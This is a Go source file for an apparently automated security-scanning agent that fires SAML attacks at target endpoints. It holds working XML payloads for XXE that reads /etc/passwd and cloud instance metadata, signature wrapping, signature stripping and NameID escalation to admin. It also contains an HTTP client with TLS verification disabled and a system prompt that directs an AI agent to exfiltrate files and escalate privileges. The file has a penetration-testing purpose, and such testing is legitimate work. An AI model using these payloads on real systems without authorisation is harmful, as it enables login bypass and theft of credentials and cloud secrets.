// Package saml implements the SAML vulnerability specialist agent.
//
// Tests for:
//  1. Signature wrapping (XSW) — duplicate assertion with different NameID
//  2. XXE via SAML assertion (DOCTYPE injection)
//  3. XML signature stripping (remove ds:Signature element)
//  4. NameID manipulation (admin role escalation in assertion)
package saml

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"crypto/tls"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

// Agent implements the Specialist interface for SAML vulnerability detection.
type Agent struct {
	systemPrompt string
}

// New creates a new SAML specialist agent.
func New() *Agent {
	return &Agent{systemPrompt: defaultSystemPrompt}
}

func (a *Agent) Name() string         { return "SAML Agent" }
func (a *Agent) ID() string           { return "saml" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

// samlEndpointPatterns are URL substrings that indicate a SAML ACS or SSO endpoint.
var samlEndpointPatterns = []string{
	"/saml",
	"/sso",
	"/acs",
	"/auth/saml",
	"SAMLResponse",
}

// isSAMLTarget returns true if the target URL looks like a SAML endpoint.
func isSAMLTarget(targetURL string) bool {
	lower := strings.ToLower(targetURL)
	for _, p := range samlEndpointPatterns {
		if strings.Contains(lower, strings.ToLower(p)) {
			return true
		}
	}
	return false
}

// samlPayload groups a named test payload with its base64-encoded assertion.
type samlPayload struct {
	name    string
	payload string // raw XML
}

// generatePayloads returns SAML attack payloads as raw XML strings.
func generatePayloads() []samlPayload {
	// 1. XXE via DOCTYPE injection
	xxe := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxehttp SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_xxe_test" Version="2.0"
                IssueInstant="2024-01-01T00:00:00Z">
  <saml:Assertion ID="_assertion" Version="2.0"
                  IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>https://attacker.example.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z"
                     NotOnOrAfter="2099-01-01T00:00:00Z"/>
    <saml:AuthnStatement AuthnInstant="2024-01-01T00:00:00Z">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>
          urn:oasis:names:tc:SAML:2.0:ac:classes:Password
        </saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>`

	// 2. Signature wrapping (XSW) — valid assertion + duplicate assertion with admin NameID
	xsw := `<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_xsw_test" Version="2.0"
                IssueInstant="2024-01-01T00:00:00Z">
  <saml:Assertion ID="_legit" Version="2.0"
                  IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID>user@example.com</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z"
                     NotOnOrAfter="2099-01-01T00:00:00Z"/>
    <saml:AuthnStatement AuthnInstant="2024-01-01T00:00:00Z">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>
          urn:oasis:names:tc:SAML:2.0:ac:classes:Password
        </saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:Reference URI="#_legit"/>
      </ds:SignedInfo>
      <ds:SignatureValue>PLACEHOLDER_SIGNATURE</ds:SignatureValue>
    </ds:Signature>
  </saml:Assertion>
  <!-- XSW: injected assertion processed first by vulnerable SPs -->
  <saml:Assertion ID="_xsw_injected" Version="2.0"
                  IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID>admin</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z"
                     NotOnOrAfter="2099-01-01T00:00:00Z"/>
    <saml:AuthnStatement AuthnInstant="2024-01-01T00:00:00Z">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>
          urn:oasis:names:tc:SAML:2.0:ac:classes:Password
        </saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>`

	// 3. Signature-stripped assertion (no ds:Signature element)
	stripped := `<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_stripped_sig" Version="2.0"
                IssueInstant="2024-01-01T00:00:00Z">
  <saml:Assertion ID="_assertion_stripped" Version="2.0"
                  IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID>admin@example.com</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z"
                     NotOnOrAfter="2099-01-01T00:00:00Z"/>
    <saml:AuthnStatement AuthnInstant="2024-01-01T00:00:00Z">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>
          urn:oasis:names:tc:SAML:2.0:ac:classes:Password
        </saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>`

	// 4. NameID manipulation — claim to be admin directly
	nameID := `<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_nameid_manip" Version="2.0"
                IssueInstant="2024-01-01T00:00:00Z">
  <saml:Assertion ID="_assertion_nameid" Version="2.0"
                  IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">admin</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z"
                     NotOnOrAfter="2099-01-01T00:00:00Z"/>
    <saml:AuthnStatement AuthnInstant="2024-01-01T00:00:00Z">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>
          urn:oasis:names:tc:SAML:2.0:ac:classes:Password
        </saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="Role">
        <saml:AttributeValue>admin</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>`

	return []samlPayload{
		{name: "xxe_doctype", payload: xxe},
		{name: "xsw_signature_wrapping", payload: xsw},
		{name: "stripped_signature", payload: stripped},
		{name: "nameid_manipulation", payload: nameID},
	}
}

// newHTTPClient returns a non-redirecting TLS-insecure HTTP client.
func newHTTPClient() *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
	}
	return &http.Client{
		Timeout:   15 * time.Second,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// Stop after first redirect so we can inspect auth cookies.
			if len(via) >= 1 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

// xxeErrorPatterns are strings that indicate XXE processing in the response.
var xxeErrorPatterns = []string{
	"root:x:",           // /etc/passwd content
	"SYSTEM",            // echoed DOCTYPE
	"xml parsing error",
	"xml.etree",
	"SAXParseException",
	"XMLSyntaxError",
	"entity",
	"<!DOCTYPE",
}

// successPatterns are strings/status codes indicating auth bypass.
func isAuthSuccess(resp *http.Response, body string) bool {
	if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound {
		lower := strings.ToLower(body)
		// Auth cookies in redirect or session indicators.
		for _, cookie := range resp.Cookies() {
			name := strings.ToLower(cookie.Name)
			if strings.Contains(name, "session") || strings.Contains(name, "auth") ||
				strings.Contains(name, "token") || strings.Contains(name, "jwt") {
				return true
			}
		}
		// Absence of common error indicators + presence of dashboard/welcome terms.
		if !strings.Contains(lower, "invalid") && !strings.Contains(lower, "error") &&
			!strings.Contains(lower, "denied") {
			if strings.Contains(lower, "dashboard") || strings.Contains(lower, "welcome") ||
				strings.Contains(lower, "logout") || strings.Contains(lower, "account") {
				return true
			}
		}
	}
	return false
}

func hasXXESignature(body string) bool {
	lower := strings.ToLower(body)
	for _, p := range xxeErrorPatterns {
		if strings.Contains(lower, strings.ToLower(p)) {
			return true
		}
	}
	return false
}

// ProcessItem tests a target URL for SAML vulnerabilities.
func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL in work item")
	}

	if !isSAMLTarget(targetURL) {
		return nil, nil
	}

	client := newHTTPClient()
	var findings []*base.Finding

	payloads := generatePayloads()
	for _, p := range payloads {
		encoded := base64.StdEncoding.EncodeToString([]byte(p.payload))

		formData := url.Values{}
		formData.Set("SAMLResponse", encoded)

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, targetURL,
			strings.NewReader(formData.Encode()))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; SecurityScanner/1.0)")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
		resp.Body.Close()
		body := string(bodyBytes)

		conf := 0.0
		evidence := map[string]interface{}{
			"saml_test":   p.name,
			"status_code": resp.StatusCode,
		}

		if isAuthSuccess(resp, body) {
			conf = 0.85
			evidence["auth_bypass"] = true
			evidence["cookies"] = cookieNames(resp)
		} else if hasXXESignature(body) {
			conf = 0.6
			evidence["xxe_signature"] = true
			evidence["body_snippet"] = truncate(body, 200)
		}

		if conf == 0.0 {
			continue
		}

		vulnType := "SAML Authentication Bypass"
		severity := "critical"
		switch p.name {
		case "xxe_doctype":
			vulnType = "SAML XXE Injection"
			severity = "high"
		case "xsw_signature_wrapping":
			vulnType = "SAML Signature Wrapping (XSW)"
		case "stripped_signature":
			vulnType = "SAML Signature Stripping"
		case "nameid_manipulation":
			vulnType = "SAML NameID Manipulation"
		}

		findings = append(findings, &base.Finding{
			Type:       vulnType,
			URL:        targetURL,
			Parameter:  "SAMLResponse",
			Payload:    p.name,
			Severity:   severity,
			Confidence: conf,
			Evidence:   evidence,
			Method:     "POST",
		})
	}

	return findings, nil
}

func cookieNames(resp *http.Response) []string {
	var names []string
	for _, c := range resp.Cookies() {
		names = append(names, c.Name)
	}
	return names
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}

const defaultSystemPrompt = `You are a SAML security specialist. Test for:
1. Signature Wrapping (XSW): inject duplicate assertions with modified NameID
2. XXE via SAML DOCTYPE injection: exfiltrate /etc/passwd or cloud metadata
3. Signature Stripping: remove ds:Signature and check if SP still accepts the assertion
4. NameID Manipulation: escalate to admin by setting NameID="admin"

POST base64-encoded SAMLResponse to /saml, /sso, /acs endpoints.
Success indicators: auth cookies in response, redirect to dashboard, absence of error message.`
